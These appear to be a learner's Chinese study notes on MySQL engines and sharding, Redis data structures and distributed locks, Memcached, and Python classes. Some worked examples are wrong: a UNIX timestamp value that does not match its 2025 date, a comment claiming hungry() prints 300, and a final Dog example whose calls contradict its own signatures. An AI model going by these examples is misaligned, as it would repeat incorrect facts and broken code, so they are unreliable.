> 压缩表：就是将MyISAM 表数据文件（*.MYD）压缩成只读格式，就不能再进行插入和删除操作了
>
> 空间数据索引：就是用 R-Tree 管理地理/几何数据的最小外包矩形，加速空间范围与相交查询。

不支持事务

不支持行级锁，只能对整张表进行加锁。读取的时候会对需要读到的所有表加共享锁，写入的时候会对表加排他锁。但是在有表读取操作的时候也可以往表中插入新的记录，这种称为并发插入（CONCURRENT INSERT）但是插入的数据只能插入在表尾。

如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。==这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。==

### 比较

| 特性     | MyISAM                           | InnoDB                              |
| -------- | -------------------------------- | ----------------------------------- |
| 事务     | 不支持事务（无 Commit/Rollback） | 支持事务，可使用 Commit 和 Rollback |
| 并发     | 只支持表级锁（表读写时全表锁）   | 支持行级锁，提高并发粒度            |
| 外键     | 不支持外键                       | 支持外键约束                        |
| 备份     | 不支持真正的在线热备份           | 支持在线热备份                      |
| 崩溃恢复 | 崩溃后易损坏，恢复慢             | 崩溃保护好，恢复速度快              |
| 其它特性 | 支持压缩表、空间数据索引         | 无此特性                            |

## 数据类型

### 整型

TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。

INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。（因为INT是固定的32位存储）

### 浮点数

FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价（DECIMAL是由数据库引擎在自己的进程里、通过软件库来完成）。

FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。

### 字符串

主要有 CHAR 和 VARCHAR 两种类型，CHAR是定长的，VARCHAR是变长的。

VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是由于VARCHAR前面都会有1～2 字节来表示长度，所以当UPDATE操作的时候会导致长度变长，变长字段内容变多，自带的长度前缀就变长。就会导致可能会超出一页所能容纳的大小，就需要进行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。

在进行存储和检索的时候，会保留VARCHAR末尾的空格，删除CHAR末尾的空格。

### 时间和日期

MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。

1. DATETIME 

能够保存从 1000 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。与时区无关，就是存入什么就显示什么，用这种方式来显示时间的：2008-01-16 22:37:08

2. TIMESTAMP

保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。

和时区有关

MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳

```sql
-- UNIX时间表是从1970 年 1 月 1 日到现在经过的秒数，会是一个很多的数字，例如1683676800

-- 会话时区设为 +08:00
SET time_zone = '+08:00';

-- 数据行中 DATETIME 存的是 '2025-05-10 14:00:00'
INSERT INTO events (created_at) VALUES ('2025-05-10 14:00:00');

-- UNIX_TIMESTAMP 会先把它当成台北时间，
-- 转成 UTC：'2025-05-10 06:00:00 UTC'，
-- 然后算自 1970-01-01 起的秒数，返回 1715373600。
SELECT UNIX_TIMESTAMP(created_at) FROM events;

-- 从 UNIX 时间戳生成带时区的 DATETIME
SELECT FROM_UNIXTIME(1683676800, '%Y-%m-%d %H:%i:%s');
```

## 切分



水平切分和垂直切分

### 水平切分(sharding)

将同一个表中的记录拆分到多个==结构相同==的表中。

![image-20250510120435380](D:\typora图片\image-20250510120435380.png)

### 垂直切分

垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。

![image-20250510120530990](D:\typora图片\image-20250510120530990.png)

**sharding(水平切分)策略**

1. 哈希取模：对分片键（如用户 ID、订单 ID 等）先做哈希运算（将非数字转换成为数字），再对分片总数 N 取模，得到一个 0…N-1 的下标，决定这条记录落到哪个分片（或哪张表、哪台库）。

   优点：

   > 分布均匀：哈希能打散“热门”key，天然避免单点热点；
   >
   > 路由开销小：计算一次哈希＋取模，O(1) 即可直接定位。

2. 范围：

   根据主键或某个列的取值区间来划分，每个分片负责一段连续值或一段时间。

   优点：

   > 范围查询高效：直接定位到一个或少数几个分片就能完成；
   >
   > 扩容灵活：只要新建一个负责新范围的分片。

3. 映射表：

   使用一个单独的数据库来存储映射关系

   优点：

   > 灵活度最高：可以随时调整映射关系（冷热分离、手动迁移）；
   >
   > 支持任意复杂策略：不一定非得哈希或范围，都可以自定义。

**sharding存在的问题**

1. 事务问题：使用分布式的事务来解决，因为数据是存储在不同的数据库上的

2. 连接问题：跨数据库的JOIN是无法在数据库层面解决的，只能在用户程序中进行连接

3. ID唯一性：需要保证不同节点同时生成的ID是不重复的。

   可以使用下面三种方法来实现：

   > - 使用全局唯一 ID（GUID）
   > - 为每个分片指定一个 ID 范围
   > - 分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)，就是如下所示：
   >
   > |  1 位符号  | 41 位时间戳 | 5 位数据中心 ID | 5 位机器 ID | 12 位序列号 |
   > |  （始终0） | (毫秒级)    | (最多 32 个)    | (最多 32 个)  | (每毫秒 4096 个) |

## 复制

### 主从复制

主要涉及到三个线程：binlog线程，I/O线程，SQL线程

- binlog线程：负责将主服务器上的数据更改写入Binary log中
- I/O线程：负责从主服务器上读取日志，并写入到从服务器的中继日志（Relay log）
- SQL线程：负责读取中继日志，解释出服务器已经执行的数据更改并在从服务器中执行重放（Replay）（重放就是更新从服务器中的数据）

![image-20250510122805338](D:\typora图片\image-20250510122805338.png)

### 读写分离

主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。

读写分离能提高性能的原因在于：

- 主从服务器负责各自的读和写，极大程度缓解了锁的争用；
- 从服务器可以使用 MyISAM，提升查询性能以及节约系统开销；
- 增加冗余，提高可用性。

读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。最后的ClusterControl主要是负责统一对主从拓扑做监控、告警、自动化运维、备份、故障恢复等。

![image-20250510122904675](D:\typora图片\image-20250510122904675.png)

# Redis

## 概述

Redis是速度非常快的NoSQL键值对数据库，Redis数据库是存放在内存中的。

键的类型只能是字符串，值的类型有：字符串、列表、集合、散列表、有序集合

Redis支持很多特性，将内存的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能

## 数据类型

| 数据类型 |      可以存储的值      |                             操作                             |
| :------: | :--------------------: | :----------------------------------------------------------: |
|  STRING  | 字符串、整数或者浮点数 | 对整个字符串或者字符串的其中一部分执行操作、 对整数和浮点数执行自增或者自减操作 |
|   LIST   |          列表          | 从两端压入或者弹出元素 、 对单个或者多个元素进行修剪、只保留一个范围内的元素 |
|   SET    |        无序集合        | 添加、获取、移除单个元素、检查一个元素是否存在于集合中、计算交集、并集、差集、 从集合里面随机获取元素 |
|   HASH   | 包含键值对的无序散列表 | 添加、获取、移除单个键值对、 获取所有键值对、检查某个键是否存在 |
|   ZSET   |        有序集合        | 添加、获取、删除元素， 根据分值范围或者成员来获取元素，计算一个键的排名 |



### String

```html
> set hello world
OK
> get hello
"world"
> del hello
(integer) 1
> get hello
(nil)
```

### List

```html
# 在列表的左边插入abc
LPUSH mylist a b c

# 在列表的右边插入xyz
RPUSH mylist x y z

# 弹出列表头元素
LPOP mylist

# 弹出列表尾元素 
RPOP mylist

# 返回整个列表
LRANGE mylist 0 -1 
LRANGE mylist 1 3    # 返回索引 1 到 3 的元素

# 检查列表的长度
LLEN mylist     


# 设置指定下标的元素新值
LSET mylist 2 foo    # 将索引 2 的元素改为 "foo"
```

### SET

set里面只能是唯一的元素，如果里面已经存在的键，就不能再添加相同名字的键了

```html
sadd 添加key

> sadd set-key item
(integer) 1
> sadd set-key item2
(integer) 1
> sadd set-key item3
(integer) 1
> sadd set-key item
(integer) 0

smember 找出所有的key

> smembers set-key
1) "item"
2) "item2"
3) "item3"

sismember 判断键在不在集合里面

> sismember set-key item4
(integer) 0
> sismember set-key item
(integer) 1

srem 删除键

> srem set-key item2
(integer) 1
> srem set-key item2
(integer) 0
```

### HASH

```html
HSET：向哈希中添加或更新字段，哈希不止有key，还有field，还有value。只有HASH才有field字段
HSET key field value

> hset hash-key sub-key1 value1 
(integer) 1
> hset hash-key sub-key2 value2
(integer) 1
> hset hash-key sub-key1 value1
(integer) 0

HGETALL：获取哈希里所有字段及对应值

> hgetall hash-key
1) "sub-key1"
2) "value1"
3) "sub-key2"
4) "value2"

HDEL：删除一个或多个字段

> hdel hash-key sub-key2
(integer) 1
> hdel hash-key sub-key2
(integer) 0

HGET：获取指定字段的值

> hget hash-key sub-key1
"value1"
```

### ZSET

ZSET中的元素会有对应的分数

**ZADD**：向有序集合中添加（或更新）成员及其分数（score）

```html
ZADD zset-key 728 member1
```

**ZRANGE … WITHSCORES**：按分数从低到高返回指定区间内的成员及其分数

```html
ZRANGE zset-key 0 -1 WITHSCORES  
```

**ZRANGEBYSCORE**：按分数范围返回成员及其分数

```html
ZRANGEBYSCORE zset-key 0 800 WITHSCORES  
```

**ZREM**：从有序集合中删除指定成员

```html
ZREM zset-key member1
```

## 数据结构

### 字典

==在redis里面，如果发生哈希冲突的话，那么就会去访问桶下面所有的链表的元素，直到找到对应的元素==

字典的好处：

> 1. 对于任意的key，可以在常数时间内完成查找／插入／删除
> 2. 可以快速判断元素在不在，例如插入一个元素的话，可以判断是新增还是更新当前元素

下面的代码是Redis对字典实现的源码。

```c
typedef struct dictht {
    dictEntry **table;      # 是一块连续的内存区域，里面存放的是许多桶中每个桶对应的头指针
    unsigned long size;     # 是当前桶的总数，一般来说是2的幂次方
    unsigned long sizemask; # 用来通过按位与快速计算桶索引（不是通过取余的方式计算得到索引的，按位与比较快）sizemask = size-1
    unsigned long used;     # 已插入的键值对总数
} dictht;
```

> 当桶的个数是2的幂次方的时候，可以用与的操作来代替求余的操作
>
> 就是size和sizemask求与之后会得到对应的桶索引

**字典项**

表示表中的一个实际元素（一个键值对）。每次往哈希表插入一个键值对，就会 new 一个 `dictEntry` 节点。

```c
typedef struct dictEntry {
    void *key;                // 指向“键”的指针
    union {                   // “值”可以有多种类型，你根据需要选一个来用
        void   *val; 		 // 通用指针
        uint64_t u64;   	 // 无符号 64 位整数
        int64_t  s64;   	 // 有符号 64 位整数
        double   d;     	 // 浮点数
    } v;
    struct dictEntry *next;  // 同一桶里下一个 entry（拉链法）
} dictEntry;
```

**rehash**

用来管理整个哈希表及其增量重哈希过程，就是对旧的哈希表进行扩容/缩容

```c
typedef struct dict {
    dictType *type;          // 指向一组函数指针，定义了如何对 key、value 做哈希、比较、释放等操作
    void *privdata;          // 私有数据指针，会传给 type 里的函数做上下文
    dictht ht[2];            // 两张哈希表：ht[0] 是当前表，ht[1] 用于增量扩容/缩容时的目标表
    long rehashidx;          // 如果正在重哈希，则表示下一个要迁移的桶索引；等于 -1 表示未在重哈希
    unsigned long iterators; // 当前正在运行的迭代器数量，用于 safe iterator 期间避免重哈希
} dict;
```

> 增量的过程：不是特意去将旧的数据移动到新的哈希表中的，是在每一次用户的查询过程中将数据移动到新的哈希表中
>
> - 那么如何确定是去新的哈希表还是旧的哈希表中进行查找的呢？（会根据rehashidx进行判断）
>
> 1. 如果数据所在的桶小于rehashidx，那么就会去新的表里进行查找
>
> 2. 如果数据所在的桶大于rehashidx，那么就会去旧的桶里查找，因为这个表示数据还没移动到新的哈希表中
>
> - 如果你今天查找的是8号桶的数据，那么是先移动0号桶的数据，还是移动8号桶的数据呢？（先移动再查找）
>
> 1. 先将0号桶的数据移动到新的哈希表中（不会移动8号桶，会先移动0号桶）
> 2. 然后再去执行查找8号桶的操作
>
> - 数据移动到新的表之后，那么旧的表会进行什么操作呢？（旧的表会将移动过的数据进行删除）
>
> 1. 新旧表都会存储一部分的数据。数据移动到新的表格之后，旧表格就会删除。
> 2. 如果有新的数据到来的话，那么会根据rehashidx判断要插入新表还是旧的表格。假设现在新表存储的是0-20，旧的是21-40的话。那么当有数据要插入0号桶的话，就会查看0号桶是不是移动到新表，是的话就直接插入新表，不是的话就将数据插入到旧表。

采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。

### 跳跃链表

跳跃表是有序集合的实现之一，跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。

下图所示就是一个跳跃链表，其中最底层BL里面存储的是所有的链表数据，上面的层只会存储部分的数据。

下图是一个查找的过程：

> 1. 先在L3查找，没有的话就到L2查找，发现25>22就继续到下一层
> 2. 到达L1之后，就会接着查找，找到15则继续，发现25>22，就继续到下一层BL查找
> 3. 最终在BL层找到节点22

![img](D:\typora图片\0ea37ee2-c224-4c79-b895-e131c6805c40.png)

跳跃链表的优点：

> 1. 插入方便，红黑树插入的时候还需要翻转才可以实现排序
> 2. 自平衡树（红黑树）的实现逻辑复杂，代码量大，跳跃链表就比较容易实现，只需要维护每一层节点的next指针即可
> 3. 在多线程并发场景里，对红黑树做插入／删除通常需要对整个树加写锁。但是跳跃链表可以不用。因为跳跃链表采用的是硬件原子 CAS（CAS是只有当内存中的值等于预期值时，才把它修改为新值，否则不做任何改变，并告诉调用者操作是否成功），所以整个操作是不可分的，只有全部做完或者全部不做。

## Redis使用场景

### 计数器

可以对 String 进行自增自减运算，从而实现计数器功能。Redis是内存型数据库，适合存储频繁读写的计数量。

### 缓存

将热点数据放在内存中，设置内存最大使用量以及淘汰策略来保持缓存的命中率。缓存的内容可能会失效

### 查找表

像DNS的记录就可以用Redis来存储，查找表的内容不能失效，但是缓存的内容会失效

### 消息队列

Listl的数据类型其实是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息。最好还是使用 Kafka、RabbitMQ 等消息中间件。

### 会话缓存

服务器不会存储某个对话对应的cookie了而是将所有的cookie存储到Redis数据库当中。因为如果存储的话，那么该请求将会永远到达这个服务器了（粘性）。浏览器会保存Cookie，浏览器发送用户的请求之后就会带上这个Cookie，然后中间件会将这个请求发送到后端的服务器而不是固定的服务器。然后后端的服务器再去Redis数据库中找到用户所对应的Cookie，并恢复出用户上下文。

### 分布式锁实现

是一种跨多台机器、在分布式环境中保证互斥访问共享资源的协调机制

实现分布式锁的方法：

1. **SETNX (SET if Not eXists)**

SETNX是如果不存在就写入并返回成功

在分布式环境中用 `SETNX`（或 `SET … NX PX ttl`）来做锁，其核心就在于那条命令的**原子性**和**排它性**：

```latex
这里的A和B是客户端唯一标识，表示当前是哪个客户端在访问共享资源


# 客户端 A
if SET mylock "A" NX PX 5000 then # NX 表示的是只有当 lock:test 不存在时才设置成功——保证互斥，PX 给锁设置超时时间，防止持锁者崩溃后锁永不释放。
  └── 成功，A 获得锁，开始访问共享资源
else
  └── 失败，A 等待后重试或直接返回获取失败

...

# 判断当前的锁是不是A，是的话就删掉A锁，因为A执行完了
if GET mylock == "A" then
  DEL mylock
end

# 客户端 B 在此期间
if SET mylock "B" NX PX 5000 then
  └── 只有等到 A 释放（或锁过期）后，B 才能成功拿到锁
```

优缺点如下：

- 优点：

> 1. 原子性强：在键不存在的时候才能写入成功（因为客户端A执行完之后会删除mylock键，如果没有这个键说明当前没有客户端在执行），保证了并发时只有一个客户端可以拿到锁
>
> 2. 实现简单：只需要一条命令即可
> 3. 性能高：Redis 本身是内存数据库，单命令执行开销极低，加锁／解锁都能在微秒级完成。
> 4. 集成方便：任何支持 Redis 的语言或框架几乎都内建了对 `SETNX` 的调用方式

- 缺点

> 1. 单点故障风险：所有的操作都依赖于一个Redis实例，一旦这个出问题就会导致功能不可用
> 2. 死锁风险：如果忘记给锁设过期（TTL），持锁者崩溃后锁永不释放。或者是锁设置时间太短，会导致其他人误拿锁。
> 3. 手动释放锁：解除锁需要先检查自己是否持锁，需要调用Lua脚本
> 4. 无阻塞延迟：SETNX 失败后客户端只能轮询（自旋）或定时重试
> 5. 功能单一：只是一把非可重入的互斥锁，不支持读写锁、可重入锁、锁续期、排队公平性等高级特性，难以应对复杂分布式场景。

2. **RedLock**

在 N 个相互独立的 Redis 实例（建议 N≥5）上并行尝试获取同一把锁，并以 多数派（>N/2）获得锁作为加锁成功的判据。

==下面是个例子：==

**部署**：至少 5 个相互独立的 Redis 实例。

**加锁**：客户端生成唯一 ID，依次向每个实例执行

```
SET resource_name unique_id NX PX ttl  
```

统计返回 OK 的实例数，若大于半数且耗时 < ttl，则视为加锁成功；否则在已成功的实例上撤销并返回失败。

**解锁**：在所有实例上运行原子 Lua 脚本

```lua
if redis.call("GET",KEYS[1]) == ARGV[1] then 
  return redis.call("DEL",KEYS[1]) 
else 
  return 0 
end
```

确保只有持锁者能释放。

**特点**：多数派可用保证高容错，TTL 防死锁，无需客户端时钟同步。

### 其它

Set 可以实现交集、并集等操作，从而实现共同好友等功能。

ZSet 可以实现有序性操作，从而实现排行榜等功能。

## Redis和Memcached

Redis和Memcached都是非关系型数据库

> 关系型数据库：关系数据库是基于关系模型创建的数据库，数据以表的形式存放，在使用前需要定义表结构，非关系型得到数据库都可以通过 SQL 语句来查询，通过SQL和事务保证数据一致性和完整性（支持ACID事务）。适合于复杂的关系强、事务多、报表／分析复杂的传统业务系统
>
>
> 非关系型数据库：非关系型数据库可以不定义结构，每种数据库的API/查询语言都不一样。适用于实时写入、缓存、日志、社交、推荐等场景

### 数据类型不同

Memcached只支持字符串，但是Redis支持五种不同的数据类型

### 数据持久化

数据持久化的意思是：将内存中的数据定期或实时地保存到磁盘上，以便在Redis重启或者是崩溃后能够恢复原有地数据状态

Redis有两种持久化地策略：RDB快照以及AOF日志，但是Memcached不支持数据持久化

### 分布式

**Memcached的分布式是采用一致性哈希（Consistent Hashing）的方式实现的，一致性哈希是一种哈希算法**

> 一致性哈希
>
> 1. 将所有的Memcached节点放在一个哈希环上做虚拟节点映射
> 2. 如果服务器有新的节点加入，只需要在客户端添加（可以采用手动添加，或者是动态配置等）即可，不需要服务器之间的相互通信。
> 3. 当有节点发生故障的时候，只需要顺着哈希环将故障节点的数据移动到新的节点上即可，只会影响部分范围的数据。如果是直接哈希或是除法哈希的话，当系统中服务器的数量增加或减少（例如添加或移除服务器）时，使用传统哈希算法会导致大多数键需要重新映射到新的服务器上，这会引起数据的大规模迁移，效率很低。
> 4. 每次get/set的时候，客户端会先对key做哈希，找到环上顺时针的第一个对应的机器。
> 5. 向那台机器发送请求

一致性哈希的例子

- 假设有 3 台服务器 A、B、C，它们的哈希值分别位于虚拟哈希环上的不同位置。比如，A 的哈希值是 3，B 的哈希值是 7，C 的哈希值是 11（这里简化了哈希值的范围，实际应用中哈希值范围会更大）。
- 当要存储一个对象 X，计算对象 X 的哈希值为 5。在哈希环上，从对象 X 的哈希值 5 位置开始顺时针查找，找到的第一个服务器节点是 B（7），所以对象 X 就会被存储到服务器 B 上。
- 如果此时添加一个新的服务器 D，其哈希值为 9。那么对于对象 X 来说，它的存储位置仍然是服务器 B，因为从 X 的哈希值 5 顺时针查找，最近的服务器仍然是 B。但是，对于哈希值在 7 - 9 之间的对象，它们的存储位置就会从服务器 B 变为服务器 D，这样就只会影响一部分对象的映射关系。

==Memcached的优点：==

实现简单，不需要进行额外的集群管理

==Memcached的缺点：==

1. 客户端需要自己持有和更新服务器节点列表以及一致性哈希算法
2. 不支持跨节点复制、故障转移：这是因为Memcached每个节点存储的数据都是不一样的，不会将当前节点存储的数据复制备份到另一个节点，所以节点宕机的话就会导致这个节点的数据不能使用。所以Memcached适用用于高速缓存，因为缓存的数据是允许丢失的，如果节点发生故障，那么可以用一个新的节点从数据库或者源头加载数据即可。

**Redis Cluster的分布式**

Redis Cluster的分布式是在服务器内实现的，在服务器内部建立分片和路由，流程如下：

1. 将整个Key空间划分为16384的槽（Slot），每个节点负责一部分的Key（槽）
2. 节点之间通过gossip协议互相发现、选主、故障转移
3. 客户端如果发送一个Key到不是负责该Key的节点，节点就会返回MOVED或ASK，客户端或者驱动就会自动重试到正确的节点
4. 某个主节点挂掉后，集群可以自动将从节点升级为主节点，并更新所有节点 / 客户端的拓扑信息。

### 内存管理机制

Redis和Memcached的数据会一直存放在内存中

Memcached将内存分割为特定长度的块来存储数据，但是这样会导致内存的利用率不高

Redis按照不同的对象动态分配内存，利用 jemalloc 的 bin、arena 机制减少系统调用和碎片，同时通过 SDS、ziplist/quicklist 等策略兼顾性能和空间利用。

































# Python

## class

类的特性什么的，可以看https://www.youtube.com/watch?v=WBrX9n0SWG8

![image-20250410120822866](D:\typora图片\image-20250410120822866.png)

**继承**

> 继承的话分为两种继承，一个是多继承（继承多个父类）一个是单继承（只继承一个父类）
>
> 1. 继承多个父类的时候，例如 class Son（father, mother)，并且father和mother里面都有一个共同的方法叫做work，那么son=Son()的时候，son.work是会调用father类里面的work方法而不是mother，因为有多个父类的话会继承第一个父类的方法
> 2. 继承单个父类，例如class father（grandpa），class son（father）。如果grandpa和father里面都有一个work方法的话，那么son在调用work方法的时候是会执行father的work方法，因为father的work方法会将grandpa的work方法覆盖

**封装**

> 封装的意思是类里面的方法在类内部可以运行，但是在实例化对象的时候，这个对象不能调用类内部的方法
>
> 例如下面这个例子：

```python
class Father():
    def __init__(self):
        self.color = 'red'
        self.legs = 'long'
        self.__IQ = 300
        
    def play(self):
        print('play happy')
        print(self.__IQ)
        
    def __eat(self):
        print('good')
    
    def hungry(self):
        self.__eat()
    
father = Father()
father.hungry() # 会成功打印good和300出来，因为是在内部调用__eat方法
father.__eat()  # 不会执行，因为对象不能调用类内部的方法
father.color    # 会成功打印出red
father.__IQ     # 报错
```

为什么需要这样呢，是因为在类的内部有的时候需要调用一些函数或者方法，但是不希望实例化后的对象可以调用这些方法，所以需要这样（可以想象成为在类的内部需要校验密码，但是又不需要对象可以获取密码，那么就可以用这个方法）

**多型**

对象之间不会相互影响

```python
class Cat():
    def __init__(self):
        self.color = 'red'
        
        
yx = Cat()
yx.color = 'blue'

hy = Cat()
hy.color = 'pink'

print(yx.color)
print(hy.color)

# 输出blue和pink
```

**self**

self表示的就是类里面自己的，如果要调用类里面的属性或者方法的话就要加上self。如果方法内部有重名的属性，那么不加self就会用方法内部的属性，加了self就是调用类的属性。例如run内部如果也有color的话，那么print(color)就会打印run内部的color，否则打印的是类里面的color

```python
class Dog():
    def __init__():
        color = 'red'
        leg = 'long'

    def run():
        print('running')
        print(color)   # 报错，因为没有加上self无法访问类里面的属性

Dog.run()

# 下面的语句可以正常执行
class Dog():
    def __init__(self):
        self.color = 'red'
        self.leg = 'long'

    def run(self):
        print('running')
        print(self.color)


dog = Dog() 
dog.run()  # 可以正常打印running和color

# 或者用下面的方法调用
dog = Dog()
Dog.run(dog)
```

**init**

init方法会在实例化的时候就被调用，如果init里面除了self还有其他参数的话，那么在实例化对象的时候就得传入这个参数

```python
class Dog():
    def __init__(self, name):
        self.color = 'red'
        self.leg = 'long'
        self.name = name
        print('hello')

    def run(self):
        print('running')
        print(self.color)
        print(self.name)


dog = Dog() #就会打印hello出来，因为会调用__init__函数
dog.run('hhhh')  # 可以正常打印running和color以及hhhh
```

